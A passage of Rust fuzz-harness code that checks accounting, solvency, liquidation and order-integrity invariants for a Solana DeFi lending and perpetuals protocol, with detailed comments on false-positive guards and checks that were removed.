            backed += pool_tokens(perp_market.pnl_pool.scaled_balance);
            backed += pool_tokens(perp_market.amm.fee_pool.scaled_balance);
        }

        // The vault must be able to cover all quote claims backed here. Rounding
        // (deposits floor, borrows ceil) and external SPL donations only ever
        // make the vault >= claims; vault < claims means quote was created.
        let vault_i = vault_amount as i128;
        fuzz_assert!(
            vault_i >= backed,
            "quote conservation: vault={} < backed claims={} (net_user={})",
            vault_i,
            backed,
            net_user_tokens
        );
    }

    // =====================================================================
    // STRUCTURAL AGGREGATE CONSISTENCY (auto-derived, case (a) "one-to-many")
    //
    // Every existing check compares a market aggregate against the VAULT. These
    // compare the aggregate against the SUM OVER USERS, a genuinely different
    // property: it catches a market total that drifts from the positions it is
    // supposed to summarise, even while the vault still balances. Fills now
    // create real base/quote amounts and IF staking creates real shares, so
    // these finally have something to be wrong about.
    //
    // FP GUARD (mandatory): the harness only knows `fixture.users`. Sub-accounts,
    // the `fresh` authorities and the liquidator can also hold positions and
    // shares, so a strict equality would fire spuriously the moment any of them
    // is used. Every assertion below is the LOOSE form
    // (`sum_over_known_users <= aggregate`): an undercount can never exceed the
    // aggregate so it cannot false-positive, while still catching the dangerous
    // direction — an aggregate too SMALL for the positions that actually exist
    // (understated open interest / share supply).
    // =====================================================================
    if let Some(pm) = fixture.read_perp_market() {
        let (mut sum_long, mut sum_short) = (0i128, 0i128);
        for u in &fixture.users {
            if let Some(user) = fixture.read_user(&u.user_pda) {
                for pp in user.perp_positions.iter() {
                    if pp.market_index != 0 {
                        continue;
                    }
                    let b = pp.base_asset_amount as i128;
                    if b > 0 {
                        sum_long += b;
                    } else {
                        sum_short += b;
                    }
                }
            }
        }
        fuzz_assert!(
            sum_long <= pm.base_asset_amount_long,
            "perp aggregate: known users' long base {} exceeds market.base_asset_amount_long {}",
            sum_long,
            pm.base_asset_amount_long
        );
        // Shorts are negative, so "exceeds in magnitude" is `<`.
        fuzz_assert!(
            sum_short >= pm.base_asset_amount_short,
            "perp aggregate: known users' short base {} exceeds market.base_asset_amount_short {}",
            sum_short,
            pm.base_asset_amount_short
        );
    }

    // IF share supply must cover the shares actually held.
    if let Some(sm) = fixture.read_spot_market() {
        fuzz_assert!(
            sm.insurance_fund.user_shares <= sm.insurance_fund.total_shares,
            "IF shares: user_shares {} exceed total_shares {}",
            sm.insurance_fund.user_shares,
            sm.insurance_fund.total_shares
        );
    }

    // =====================================================================
    // TEMPORAL: interest indices are monotonically non-decreasing (T11 /
    // Class 11), EXCEPT for socialized loss. An index that moves BACKWARDS
    // silently re-values every deposit and borrow in that market.
    //
    // "Interest only ever accrues" is NOT true of the program: resolving a spot
    // bankruptcy SUBTRACTS
    // `calculate_cumulative_deposit_interest_delta_to_resolve_bankruptcy` from
    // the deposit index — that IS how a depositor haircut is applied, not a bug.
    // The old form of this check was accidentally sound only because no action in
    // this harness could reach that path; `action_resolve_spot_bankruptcy` now
    // can, so the exception has to be explicit or the check would fire on correct
    // protocol behaviour the first time a bankruptcy resolves.
    //
    // The discriminator is exact rather than heuristic: the same block that
    // subtracts from the index increments `total_social_loss`, so an increase
    // there is a precise witness that a socialization happened this step. Any
    // OTHER decrease is real.
    //
    // The BORROW index needs no such exception — `safe_add` is its only writer.
    //
    // FP GUARD: skip the first observation — there is no prior sample to
    // compare against, which is the classic initial-state false positive.
    // =====================================================================
    for idx in 0..2usize {
        let market = if idx == 0 {
            fixture.read_spot_market()
        } else {
            fixture.read_spot_market_1()
        };
        if let Some(sm) = market {
            let now = (
                sm.cumulative_deposit_interest,
                sm.cumulative_borrow_interest,
                sm.total_social_loss,
            );
            if let Some((prev_d, prev_b, prev_loss)) = fixture.last_interest[idx] {
                let socialized = now.2 > prev_loss;
                fuzz_assert!(
                    now.0 >= prev_d || socialized,
                    "spot market {}: cumulative_deposit_interest went backwards {} -> {} with \
                     NO socialized loss (total_social_loss unchanged at {})",
                    idx,
                    prev_d,
                    now.0,
                    now.2
                );
                fuzz_assert!(
                    now.1 >= prev_b,
                    "spot market {}: cumulative_borrow_interest went backwards {} -> {}",
                    idx,
                    prev_b,
                    now.1
                );
            }
            fixture.last_interest[idx] = Some(now);
        }
    }

    // =====================================================================
    // CRANK LIVENESS ("fails when it shouldn't").
    //
    // A permissionless crank that REVERTS while its preconditions hold is a
    // liveness break: funding, interest and AMM state stop advancing for
    // everyone, not just the caller. The crank actions record such failures as
    // they happen (they know the pre-state); this asserts none were recorded.
    //
    // FP GUARD: each action only records when its own precondition held —
    // right market, Active status, period elapsed, fresh oracle. Everything
    // else is a lawful refusal and is not recorded.
    // =====================================================================
    if !fixture.crank_failures.is_empty() {
        let failures = fixture.crank_failures.join(", ");
        fixture.crank_failures.clear();
        fuzz_assert!(
            false,
            "crank liveness: [{}] reverted while their preconditions were met",
            failures
        );
    }

    // --- Family II: perp open-interest conservation. ---
    // The program's own invariant: base_long + base_short == amm net position.
    if let Some(pm) = fixture.read_perp_market() {
        let net_user = pm.base_asset_amount_long + pm.base_asset_amount_short;
        fuzz_assert_eq!(
            net_user,
            pm.amm.base_asset_amount_with_amm,
            "perp OI: base_long+base_short ({}) != amm.base_asset_amount_with_amm ({})",
            net_user,
            pm.amm.base_asset_amount_with_amm
        );
    }

    // --- Family V (partial): no user carries a spot borrow in the quote
    // market with zero collateral anywhere (a trivially-underwater account that
    // was never flagged). Full maintenance-margin valuation requires the whole
    // oracle/market map and is covered end-to-end in P8; here we pin the cheap
    // structural case. ---
    for u in &fixture.users {
        if let Some(user) = fixture.read_user(&u.user_pda) {
            let mut has_borrow = false;
            let mut has_any_deposit = false;
            for sp in user.spot_positions.iter() {
                if sp.scaled_balance == 0 {
                    continue;
                }
                match sp.balance_type {
                    SpotBalanceType::Borrow => has_borrow = true,
                    SpotBalanceType::Deposit => has_any_deposit = true,
                }
            }
            let flagged = user.is_being_liquidated();
            // Collateral is not only in spot_positions: an ISOLATED perp
            // position carries its own margin in
            // `PerpPosition::isolated_position_scaled_balance`. Count it, or a
            // user whose collateral sits entirely in an isolated position looks
            // like an unflagged naked borrow when it is fully collateralised.
            let isolated_collateral: u64 = user
                .perp_positions
                .iter()
                .map(|pp| pp.isolated_position_scaled_balance)
                .sum();
            fuzz_assert!(
                !(has_borrow && !has_any_deposit && !flagged && isolated_collateral == 0),
                "family V: user {} has a borrow with no collateral and is not flagged liquidatable (isolated_collateral={})",
                u.user_pda,
                isolated_collateral
            );

            // --- Family VIII: liquidation-state coherence (Class 8). ---
            //
            // These only became meaningful once `liquidation_margin_buffer_ratio`
            // was set: before that every liquidation handler bailed out at
            // `cross_margin_margin_shortage()` with "margin buffer mode not
            // enabled", so no user could ever ENTER the being-liquidated state
            // and any invariant over it was decoration.
            //
            // VIII.a — REMOVED. It asserted that a flagged account must still hold
            // some liability, guarded by `liquidation_margin_freed == 0` to allow
            // the legitimate "just fully liquidated, exit pending" state. Both the
            // premise and the guard are wrong, so the assertion fired on correct
            // protocol behaviour:
            //
            //   * The exit path runs at the START of the next liquidation call
            //     (controller/liquidation.rs:174-179), not at the end of the one
            //     that seizes the last position, so "flagged with nothing left" is
            //     a normal resting state — the flag clears on the account's next
            //     instruction (`validate_user_not_being_liquidated`, math/
            //     liquidation.rs:314-316, reached from place_order/deposit/withdraw).
            //
            //   * `liquidation_margin_freed` cannot separate "no liquidation work
            //     happened" from "work happened". It stays 0 after a dust
            //     liquidation that frees less than one unit, and
            //     `IsolatedMarginLiquidatePerpMode::increment_free_margin` is a
            //     deliberate no-op (state/liquidation_mode.rs:356-358), so it is 0
            //     for EVERY isolated episode — while `is_being_liquidated()` is the
            //     OR of the cross and isolated flags (state/user.rs:169-171).
            //
            // Confirmed by crash_acb386b15f9272cc: reached through real
            // instructions, owner-signed only, no value gained, and cleared by the
            // user's next action. There is no cheap structural discriminator here —
            // deciding whether a flag is legitimately set needs the margin engine,
            // which is what family V and XVIII already cover. VIII.b and VIII.c
            // below are unaffected: neither depends on that counter being nonzero.

            // VIII.b — REMOVED. Tautologically true, therefore dead code.
            //
            // It asserted `!(user.is_bankrupt() && !user.is_being_liquidated())`.
            // But `is_cross_margin_being_liquidated()` is
            // `status & (BeingLiquidated | Bankrupt) > 0` (state/user.rs:173-175),
            // `PerpPosition::is_being_liquidated()` is the analogous flag OR
            // (state/user.rs:1347-1350), and `User::is_being_liquidated()` is the
            // OR of the two (state/user.rs:169-171). So `is_bankrupt()` implies
            // `is_being_liquidated()` for EVERY representable status byte — the
            // predicate cannot be false, and no action (including the
            // `resolve_*_bankruptcy` pair added alongside this removal) can make
            // it fire.
            //
            // The property it MEANT to state — "the protocol only reaches
            // Bankrupt through a real liquidation" — is a transition property,
            // not a state property, and cannot be expressed as a predicate over
            // one snapshot of `status`. VIII.c below is unaffected.

            // VIII.c — margin freed is only meaningful mid-liquidation.
            // `liquidation_margin_freed` accumulates as a liquidation retires
            // margin and is zeroed on both entry and exit
            // (`User::exit_liquidation` sets it to 0). A nonzero value on an
            // account that is NOT being liquidated means an exit path forgot to
            // clear it, which would let the next liquidation start with a
            // pre-credited shortage.
            fuzz_assert!(
                !(user.liquidation_margin_freed > 0 && !flagged),
                "family VIII.c: user {} has liquidation_margin_freed={} while not being liquidated",
                u.user_pda,
                user.liquidation_margin_freed
            );
        }
    }

    // --- Family XX: every pool inside the quote market must be backed by it. ---
    //
    // BLIND SPOT this closes, and the program NAMES it. `validate_spot_balances`
    // (math/spot_withdraw.rs) asserts `revenue_pool + protocol_fee_pool <=
    // depositors_amount` and then says, in its own comment: "Perp-market pools
    // also live inside deposit_balance but are not visible from the spot account
    // alone, so this check is necessarily partial."
    //
    // The harness has every account open at once, so it can finish the check the
    // program cannot. A perp market's `pnl_pool` and `protocol_fee_pool` are
    // Deposit-type claims on the QUOTE spot market (perp_market.rs:263-271); if
    // their sum, plus the quote market's own pools, exceeds what the quote market
    // records as deposited, the protocol is carrying obligations no depositor
    // balance backs — bad debt hidden in a place no single account reveals.
    //
    // Structural: every term is a scaled balance converted by the program's own
    // `get_token_amount` against the same market. No valuation, no oracle, so it
    // cannot disagree with the margin engine.
    if let (Some(q), Some(pm)) = (
        read_zc::<SpotMarket>(&fixture.ctx, &fixture.spot_market_pda),
        fixture.read_perp_market(),
    ) {
        let tok = |scaled: u128| -> u128 {
            velocity::math::spot_balance::get_token_amount(
                scaled,
                &q,
                &velocity::state::spot_market::SpotBalanceType::Deposit,
            )
            .unwrap_or(0)
        };
        let deposits = tok(q.deposit_balance);
        let claims = tok(q.revenue_pool.scaled_balance)
            .saturating_add(tok(q.protocol_fee_pool.scaled_balance))
            .saturating_add(tok(pm.pnl_pool.scaled_balance))
            .saturating_add(tok(pm.protocol_fee_pool.scaled_balance));
        fuzz_assert!(
            claims <= deposits,
            "family XX: pools inside the quote market claim {} but the market records only {} \
             deposited (spot revenue={} spot protocol_fee={} perp pnl_pool={} perp \
             protocol_fee={}) — obligations with no depositor balance behind them",
            claims,
            deposits,
            tok(q.revenue_pool.scaled_balance),
            tok(q.protocol_fee_pool.scaled_balance),
            tok(pm.pnl_pool.scaled_balance),
            tok(pm.protocol_fee_pool.scaled_balance)
        );
    }

    // --- Family XIX: general bad debt — borrows must stay backed by deposits. ---
    //
    // BLIND SPOT this closes: `borrow_balance <= deposit_balance` was asserted
    // for spot market 1 ONLY. Markets 0, 2 and 3 are all borrowable surfaces the
    // fuzzer reaches (market 0 is the quote market every account borrows against;
    // 2 and 3 receive real deposits via `transfer_pools`), and none of them had
    // this check.
    //
    // This is the market-level bad-debt statement, and it is deliberately the
    // one that needs NO valuation: both figures are the market's own scaled
    // aggregates in the same units, so comparing them cannot disagree with the
    // margin engine about prices, weights or staleness. If borrows exceed
    // deposits the market has debt no depositor's balance stands behind —
    // depositors cannot all be made whole regardless of what any oracle says.
    //
    // Distinct from the per-account view: Family V catches an individual account
    // holding a liability with no assets, and Family XVIII catches such an
    // account being unliquidatable. This catches the aggregate having gone
    // underwater even when every individual account still looks plausible.
    for (label, pda) in [
        ("spot market 0", fixture.spot_market_pda),
        ("spot market 1", fixture.spot_market_1_pda),
        ("pool-1 market A", fixture.pool1_market_a_pda),
        ("pool-1 market B", fixture.pool1_market_b_pda),
    ] {
        let Some(m) = read_zc::<SpotMarket>(&fixture.ctx, &pda) else {
            continue;
        };
        // KNOWN BUG SUPPRESSION — issue-01-spot-repay-overcredits-borrow-ledger,
        // the same one Families I and XI carry. A repay reduces recorded debt by
        // one unit more than the tokens it pays, so each one leaves the borrow
        // ledger a unit heavy against deposits; observed here as
        // `borrow 30000001 vs deposit 30000000`. Tolerate ONLY that signature —
        // a per-action unit, bounded by twice the iteration action cap — so the
        // check stays live for any larger or differently-shaped shortfall.
        const KNOWN_REPAY_ROUNDING_SLACK: u128 = 16;
        let shortfall = m.borrow_balance.saturating_sub(m.deposit_balance);
        fuzz_assert!(
            shortfall <= KNOWN_REPAY_ROUNDING_SLACK,
            "family XIX: {} carries BAD DEBT — borrow_balance {} exceeds deposit_balance {} by \
             {} (market_index={}); the shortfall is debt no depositor balance backs",
            label,
            m.borrow_balance,
            m.deposit_balance,
            shortfall,
            m.market_index
        );

        // The program's OWN authoritative statement, extended to the two pool-1
        // markets nothing else covers. `market_ras` passes only markets 0 and 1,
        // so no instruction loads 2/3 and no other family reads them — this
        // scaled comparison was their only check.
        //
        // `validate_spot_balances` returns `depositors_amount - borrowers_amount`
        // in TOKEN units, which is the index-drift-corrected form of the scaled
        // comparison above; a negative claim is bad debt no depositor balance
        // backs. Same known-bug slack.
        //
        // Restricted to the pool-1 markets on purpose: markets 0 and 1 are
        // already covered by Family I through
        // `validate_spot_market_vault_amount`, which is the stronger statement
        // (it reconciles against real vault tokens, not just the ledger).
        if matches!(label, "pool-1 market A" | "pool-1 market B") {
            let claim = velocity::math::spot_withdraw::validate_spot_balances(&m)
                .map(|c| c as i128)
                .unwrap_or(0);
            fuzz_assert!(
                claim >= -(KNOWN_REPAY_ROUNDING_SLACK as i128),
                "family XIX: {} depositors_claim is NEGATIVE ({}) — borrows exceed deposits in \
                 TOKEN units (market_index={})",
                label,
                claim,
                m.market_index
            );
        }
    }

    // --- Family XVIII: liquidation liveness (DoS). ---
    //
    // BLIND SPOT this closes: every liquidation invariant so far checks that
    // liquidation does not do the WRONG thing. None checked that it happens at
    // all. An account the protocol refuses to liquidate while it is genuinely
    // insolvent is a denial of service with teeth — the bad debt cannot be
    // cleared by anyone, and it compounds.
    //
    // Recorded at the call site (see `action_liquidate_spot`) because the
    // evidence is the transaction's ERROR CODE, which is gone by the time an
    // end-of-iteration invariant runs. Only error 6004 `SufficientCollateral`
    // counts — the protocol explicitly asserting the victim is healthy — so
    // every other lawful refusal is excluded by construction rather than by a
    // guard list.
    //
    // WAS VACUOUS until the insolvency predicate was rewritten: the old
    // `is_structurally_insolvent` required a borrow with NO deposit, but
    // `liquidate_spot` rejects exactly that shape on the asset side long before
    // it can emit 6004, so the two conditions were mutually exclusive and this
    // could never fire. See `is_unconditionally_insolvent`.
    fuzz_assert!(
        fixture.liq_refusals.is_empty(),
        "family XVIII: liquidation REFUSED (SufficientCollateral) on an account whose \
         liabilities exceed its assets at weight 1.0 — {:?}",
        fixture.liq_refusals
    );

    // --- Family XVI: token conservation at the ACCOUNT BOUNDARY. ---
    //
    // BLIND SPOT this closes, and it is the biggest one. Families I/II/XI check
    // `vault >= claims` using the program's OWN accounting — they ask whether
    // velocity's bookkeeping is internally consistent. Nothing asked the
    // separate question of whether SPL tokens themselves are conserved.
    //
    // Those are not the same property. A bug that inflates a user's recorded
    // claim AND the market's `deposit_balance` by the same amount keeps the
    // program's books consistent and sails through vault solvency — it only
    // becomes visible when the inflated claim is withdrawn and real tokens leave.
    // Measuring at the token layer catches the whole class regardless of which
    // ledger the bug corrupted, because it does not consult the ledger at all.
    //
    // This is the shape the phoenix harness is built around ("everything is
    // measured at the token-account boundary, summed over every trader"): sum
    // over EVERY account, so internal moves — deposits, withdrawals, swap legs,
    // liquidation transfers, fee sweeps — all cancel and only creation or
    // destruction of tokens survives.
    //
    // The enumeration must be exhaustive or the sum drops and this
    // false-positives. For this fixture the complete set is: both token accounts
    // per user, the four spot vaults, the two insurance-fund vaults, and the
    // crank's two ATAs (created by `withdraw_protocol_fees_*`). No other account
    // in the fixture can hold either mint — the `fresh` authorities are never
    // given token accounts, and swap counterparties reuse user accounts.
    {
        let mut usdc: u128 = 0;
        let mut sol: u128 = 0;
        for u in &fixture.users {
            usdc += fixture.ctx.token_balance(&u.token_account) as u128;
            sol += fixture.ctx.token_balance(&u.token_account_1) as u128;
        }
        usdc += fixture.ctx.token_balance(&fixture.spot_vault_pda) as u128;
        usdc += fixture.ctx.token_balance(&fixture.if_vault_pda) as u128;
        sol += fixture.ctx.token_balance(&fixture.spot_vault_1_pda) as u128;
        sol += fixture.ctx.token_balance(&fixture.if_vault_1_pda) as u128;
        // Pool-1 vaults mirror pool 0 BY MINT (that is why `transfer_pools`
        // works at all), so they hold usdc and sol respectively.
        usdc += fixture.ctx.token_balance(&fixture.pool1_vault_a_pda) as u128;
        sol += fixture.ctx.token_balance(&fixture.pool1_vault_b_pda) as u128;
        // The crank's fee-recipient ATAs are DELIBERATELY excluded — see below.

        // EXPECTED TOTALS ARE CONSTANTS, NOT A CAPTURED BASELINE.
        //
        // An earlier version snapshotted the first observation and compared
        // against it. That is WRONG under `--stateful`: the SVM is restored from
        // pooled states and periodically reset to a pristine clone, but a
        // Fixture field persists across those restorations — so a baseline
        // captured in one lineage was compared against state from another, and
        // it fired ~74k times with `baseline > now` where `now` was exactly the
        // pristine total. The baseline outlived the state it measured.
        //
        // Deriving the expected value from the fixture's OWN constants makes the
        // check stateless: it holds for every pooled state independently, with
        // nothing carried across polls.
        //
        //   USDC: NUM_USERS x INITIAL_USDC, plus 1,000 seeded into spot vault 0
        //         and 1,000 into the mirrored pool-1 USDC vault.
        //   SOL : NUM_USERS x INITIAL_SOL, plus 1,000 (9dp) into the pool-1
        //         mirror. Spot vault 1 starts empty.
        const SEED_PER_VAULT_USDC: u128 = 1_000 * QUOTE_PRECISION as u128;
        let seed_per_vault_sol: u128 = 1_000u128 * 1_000_000_000u128;
        let expected_usdc: u128 =
            NUM_USERS as u128 * INITIAL_USDC as u128 + 2 * SEED_PER_VAULT_USDC;
        let expected_sol: u128 = NUM_USERS as u128 * INITIAL_SOL as u128 + seed_per_vault_sol;

        // ONE-SIDED, and that is deliberate.
        //
        // `withdraw_protocol_fees_*` creates the recipient's ATA mid-run, so that
        // account is not in the snapshot's tracked set and does NOT get rolled
        // back when a pooled state is restored — it accumulates across states
        // whose vaults are rewound underneath it. Counting it and asserting
        // equality is unsatisfiable: observed live, only 1 unit had left the
        // vault while the ATA held 1564.
        //
        // Excluding it leaves a set closed in one direction only: tokens can
        // LEAVE it (a fee withdrawal to the crank), but nothing outside can pay
        // in — the mint authority is the velocity signer PDA and no reachable
        // instruction mints. So `counted <= expected` is exactly the true
        // statement, and it still catches the dangerous direction: value
        // conjured into user accounts or vaults.
        fuzz_assert!(
            usdc <= expected_usdc,
            "family XVI: USDC INFLATED at the token boundary — counted {} exceeds total issuance \
             {} by {}. breakdown: u0={} u1={} v0={} if0={} pool1a={} crank={}",
            usdc,
            expected_usdc,
            usdc as i128 - expected_usdc as i128,
            fixture.ctx.token_balance(&fixture.users[0].token_account),
            fixture.ctx.token_balance(&fixture.users[1].token_account),
            fixture.ctx.token_balance(&fixture.spot_vault_pda),
            fixture.ctx.token_balance(&fixture.if_vault_pda),
            fixture.ctx.token_balance(&fixture.pool1_vault_a_pda),
            fixture
                .ctx
                .token_balance(&fixture.ata(&fixture.crank.pubkey(), &fixture.usdc_mint))
        );
        fuzz_assert!(
            sol <= expected_sol,
            "family XVI: market-1 token INFLATED at the token boundary — counted {} exceeds total \
             issuance {} by {}",
            sol,
            expected_sol,
            sol as i128 - expected_sol as i128
        );
    }

    // --- Family XVII: a reduce-only fill must never GROW the position. ---
    //
    // BLIND SPOT this closes: nothing tied an order's `reduce_only` flag to its
    // effect on the position it claims to reduce.
    //
    // NOTE what this deliberately does NOT assert. An earlier version required a
    // reduce-only order to rest on the opposite side of the position, reading
    // `validate_order_for_force_reduce_only` (validation/order.rs:450) as the
    // general rule. It is not — it guards only the FORCE path (market or user
    // flagged reduce-only). For ordinary orders velocity permits a same-side
    // reduce-only order and neutralises it at fill time instead:
    // `Order::get_base_asset_amount_unfilled` (state/user.rs:1582-1596) returns
    // `Ok(0)` when the direction matches the position's sign. So a same-side
    // reduce-only order resting with zero fills is a legal, inert state, and
    // asserting on direction fired constantly on correct behaviour.
    //
    // The property that clamp exists to guarantee is the one asserted here: a
    // reduce-only fill may shrink a position or close it, never enlarge it.
    // Checked causally — the reduce-only filled total must have INCREASED in the
    // same interval that |position| grew — so a position that grows for any
    // other reason is not attributed to reduce-only.
    //
    // FP guard: skipped entirely when the user holds any OPEN non-reduce-only
    // order in that market, because then the growth has another legitimate
    // author and the two cannot be told apart from a post-hoc snapshot.
    for (i, u) in fixture.users.iter().enumerate() {
        let Some(user) = fixture.read_user(&u.user_pda) else {
            fixture.prev_reduce_only[i] = None;
            continue;
        };
        let Some(pp) = user.perp_positions.iter().find(|p| p.market_index == 0) else {
            fixture.prev_reduce_only[i] = None;
            continue;
        };
        let abs_pos = pp.base_asset_amount.unsigned_abs();
        let ro_filled: u128 = user
            .orders
            .iter()
            .filter(|o| {
                o.reduce_only
                    && o.market_type == velocity::state::user::MarketType::Perp
                    && o.market_index == 0
            })
            .map(|o| o.base_asset_amount_filled as u128)
            .sum();
        let has_plain_open_order = user.orders.iter().any(|o| {
            o.status == velocity::state::user::OrderStatus::Open
                && !o.reduce_only
                && o.market_type == velocity::state::user::MarketType::Perp
                && o.market_index == 0
        });

        if let Some((prev_abs, prev_ro_filled)) = fixture.prev_reduce_only[i] {
            if !has_plain_open_order && ro_filled > prev_ro_filled && abs_pos > prev_abs {
                fuzz_assert!(
                    false,
                    "family XVII: user {} had a reduce-only perp fill (filled {} -> {}) that GREW \
                     |position| from {} to {} with no other open order to attribute it to — the \
                     reduce-only clamp did not hold",
                    u.user_pda,
                    prev_ro_filled,
                    ro_filled,
                    prev_abs,
                    abs_pos
                );
            }
        }
        fixture.prev_reduce_only[i] = Some((abs_pos, ro_filled));
    }

    // --- Family XIII: order-array integrity. ---
    //
    // BLIND SPOT this closes: nothing checked the ORDER ARRAY itself. Orders are
    // slots in a fixed-size array reused across the account's lifetime, and the
    // things that keep them addressable — a unique id per live slot, and an
    // allocator counter ahead of every id it has handed out — were unverified.
    //
    // Two duplicate open ids make an order unaddressable: `cancel_order(id)`
    // resolves the first match, so the second is uncancellable and its margin
    // reservation is stranded for the life of the account. `next_order_id`
    // running behind a live id means the allocator is about to mint a colliding
    // one. Both are the fixed-size-container/slot-reuse failure mode (T7), and
    // both are pure counting — no valuation, so no way to disagree with the
    // program.
    for u in &fixture.users {
        let Some(user) = fixture.read_user(&u.user_pda) else {
            continue;
        };
        let open_ids: Vec<u32> = user
            .orders
            .iter()
            .filter(|o| o.status == velocity::state::user::OrderStatus::Open)
            .map(|o| o.order_id)
            .collect();
        for (i, id) in open_ids.iter().enumerate() {
            fuzz_assert!(
                !open_ids[i + 1..].contains(id),
                "family XIII: user {} has TWO open orders sharing order_id={} — the second is \
                 unaddressable by cancel_order and its margin reservation is stranded",
                u.user_pda,
                id
            );
            // The allocator must stay ahead of every id it has issued.
            fuzz_assert!(
                *id < user.next_order_id,
                "family XIII: user {} has an open order_id={} >= next_order_id={} — the next \
                 allocation collides with a live order",
                u.user_pda,
                id,
                user.next_order_id
            );
        }
    }

    // --- Family XIV: spot-position order reservations — REMOVED (unreachable). ---
    //
    // It asserted that `SpotPosition::{open_orders, open_bids, open_asks}` agrees
    // with the user's open SPOT orders. There can never be one in this fork:
    //
    //   * `place_orders` calls `validate_spot_dlob_trading_enabled_for_market_type`,
    //     which returns `SpotDlobTradingDisabled` for `MarketType::Spot`
    //     unconditionally (controller/orders.rs:850-857; call sites orders.rs:935,
    //     instructions/keeper.rs:235, instructions/user.rs:3120).
    //   * `place_perp_order` rejects a non-perp market type at
    //     controller/orders.rs:298-302 (`InvalidOrderMarketType`).
    //   * There is no `place_spot_order` instruction.
    //   * The ONLY write to a spot `open_orders` anywhere in the program is a
    //     DECREMENT, on the cancel path at controller/orders.rs:838. There is no
    //     increment outside math/orders/tests.rs. So the triple is pinned at 0 and
    //     the guard at the top of the loop `continue`d on every position, every
    //     iteration — the assert never evaluated once.
    //
    // The original rationale ("spot orders are reachable, `place_orders` takes a
    // `MarketType`") confused the parameter existing with the value being
    // accepted. Family XII covers the perp triple, which IS reachable.
    //
    // Do not re-add unless spot DLOB trading is enabled in the program; at that
    // point restore it as a near-copy of Family XII.

    // --- Family XV: market accounts live at their canonical PDAs. ---
    //
    // BLIND SPOT this closes, and it is a LATENT one rather than a live bug.
    // `SpotMarketMap::load` / `PerpMarketMap::load` do not re-derive the market
    // PDA — they read `market_index` out of the account data and key the map on
    // it. Triaging the `--mutate-accounts` findings showed that is exactly why
    // every account-substitution probe failed closed, so the whole
    // substitution-resistance story rests on one unstated precondition: index
    // and address are 1:1, because markets can only ever be created at
    // `[b"spot_market", index]` / `[b"perp_market", index]`.
    //
    // Nothing in the loaders enforces that — they inherit it. If a future admin
    // instruction ever initialises a market at a non-canonical address, or lets
    // `market_index` move independently of the seed, the entire class goes live
    // at once with no local change to review. This pins the precondition so it
    // fails the moment it stops holding.
    for (pda, seed) in [
        (fixture.spot_market_pda, &b"spot_market"[..]),
        (fixture.spot_market_1_pda, &b"spot_market"[..]),
        (fixture.pool1_market_a_pda, &b"spot_market"[..]),
        (fixture.pool1_market_b_pda, &b"spot_market"[..]),
    ] {
        let Some(m) = read_zc::<SpotMarket>(&fixture.ctx, &pda) else {
            continue;
        };
        let expected = Pubkey::find_program_address(
            &[seed, &m.market_index.to_le_bytes()],
            &fixture.program_id,
        )
        .0;
        fuzz_assert!(
            expected == pda,
            "family XV: spot market at {} carries market_index={} whose canonical PDA is {} — \
             index and address have desynchronised, which is the precondition SpotMarketMap::load \
             silently depends on",
            pda,
            m.market_index,
            expected
        );
    }
    if let Some(pm) = fixture.read_perp_market() {
        let expected = Pubkey::find_program_address(
            &[b"perp_market", &pm.market_index.to_le_bytes()],
            &fixture.program_id,
        )
        .0;
        fuzz_assert!(
            expected == fixture.perp_market_pda,
            "family XV: perp market at {} carries market_index={} whose canonical PDA is {}",
            fixture.perp_market_pda,
            pm.market_index,
            expected
        );
    }

    // --- Family IX: an at-risk account must not GROW perp exposure. ---
    //
    // Modelled on the phoenix harness's `at_risk_new_exposure_invariant`, and
    // carrying the two false positives that one had to learn:
    //
    //  1. Diff what THIS step caused, never an absolute level. A user who is
    //     merely the passive counterparty to someone else's fill has their
    //     position grow without acting; flagging the level punishes them for it.
    //     So the baseline is the previous poll's resting-order totals
    //     (`open_bids`/`open_asks`), and only `now - before` counts.
    //  2. Growth is not automatically suspicious — it has to be
    //     magnitude-INCREASING against the account's current net position. A
    //     short adding bids is reducing risk, which is exactly what an
    //     underwater account SHOULD be able to do, and what the protocol
    //     deliberately allows.
    //
    // Being-liquidated is used as the at-risk signal rather than a host-side
    // margin recomputation: it is a flag the program itself maintains, so this
    // cannot disagree with the margin engine about valuation (the same reason
    // Family VIII stays structural).
    for (i, u) in fixture.users.iter().enumerate() {
        let Some(user) = fixture.read_user(&u.user_pda) else {
            fixture.prev_exposure[i] = None;
            continue;
        };
        let pp = user.perp_positions.iter().find(|p| p.market_index == 0);
        let (bids, asks, base) = match pp {
            Some(p) => (p.open_bids, p.open_asks, p.base_asset_amount),
            None => (0, 0, 0),
        };
        let at_risk = user.is_being_liquidated();

        if let Some((prev_bids, prev_asks, prev_base, prev_at_risk)) = fixture.prev_exposure[i] {
            // Guard 1 (phoenix guard 1): at-risk in BOTH samples. A user who
            // only just became at-risk may have placed the order while healthy.
            if prev_at_risk && at_risk {
                // SIGN CONVENTION: `open_bids` is POSITIVE and `open_asks` is
                // NEGATIVE (see `open_asks = -(max_order_size)` throughout
                // math/orders/tests.rs). So ask exposure GROWS as the value gets
                // more negative. An earlier version used
                // `asks - prev_asks` for both, which measured asks moving toward
                // zero — i.e. exposure SHRINKING — and fired on accounts that
                // were correctly reducing risk (observed live with
                // `bids 4630000000 -> 0`).
                let bid_growth = bids.saturating_sub(prev_bids).max(0);
                let ask_growth = prev_asks.saturating_sub(asks).max(0);
                // Guard 2: only growth that INCREASES |position| counts.
                // Mirrors the direction test the protocol itself applies.
                let bid_increases = prev_base >= 0 && bid_growth > 0;
                let ask_increases = prev_base <= 0 && ask_growth > 0;
                fuzz_assert!(
                    !(bid_increases || ask_increases),
                    "family IX: at-risk user {} grew magnitude-increasing perp exposure \
                     (base={} prev_base={} bids {}->{} asks {}->{})",
                    u.user_pda,
                    base,
                    prev_base,
                    prev_bids,
                    bids,
                    prev_asks,
                    asks
                );
            }
        }
        fixture.prev_exposure[i] = Some((bids, asks, base, at_risk));
    }

    // --- Family X: funding must not be silently discarded. ---
    //
    // The phoenix analogue (`funding_accumulator_conservation_invariant`)
    // catches an accumulator that collapses to zero without being folded into
    // the cumulative rate. Velocity's shape is different — funding lives in
    // `cumulative_funding_rate_long/short` — so the corresponding failure is a
    // funding update that STAMPS THE CLOCK while moving neither rate.
    //
    // `update_funding_rate` advancing `last_funding_rate_ts` is the protocol
    // recording "funding for this period has been applied". If it does that on a
    // market with open interest and leaves both cumulative rates untouched, the
    // period's funding was dropped: users on both sides keep their old markers
    // and the owed amount is unrecoverable — a T5 "timestamp advanced without
    // semantic progress".
    if let Some(pm) = fixture.read_perp_market() {
        let now_long = pm.cumulative_funding_rate_long;
        let now_short = pm.cumulative_funding_rate_short;
